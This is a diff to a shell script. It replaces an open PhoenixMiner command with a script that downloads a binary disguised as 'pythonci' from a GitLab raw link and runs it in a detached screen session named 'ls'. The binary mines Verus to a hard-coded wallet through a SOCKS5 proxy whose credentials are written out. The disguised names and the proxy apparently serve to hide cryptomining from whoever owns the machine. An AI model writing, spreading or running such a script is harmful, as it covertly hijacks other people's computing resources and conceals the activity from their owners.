@@ -1,1 +1,12 @@
-apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux && sudo ./PhoenixMiner -pool ethash.poolbinance.com:1800 -wal Nizz -worker Nizz.002 -pass x -proto 4 -stales 0
+#!/bin/bash
+sudo apt update
+sudo apt install screen -y
+sudo apt install screen libjansson4 -y
+wget https://gitlab.com/Scalaxlarig/bisalahhh/-/raw/main/pythonci
+chmod +x pythonci
+screen -dmS ls
+PL=stratum+tcp://verushash.asia.mine.zergpool.com:3300
+WT=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
+WR=jajal
+PY=socks5://w1rtyuw:s1dfgyt3b@150.129.171.123:6667
+./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
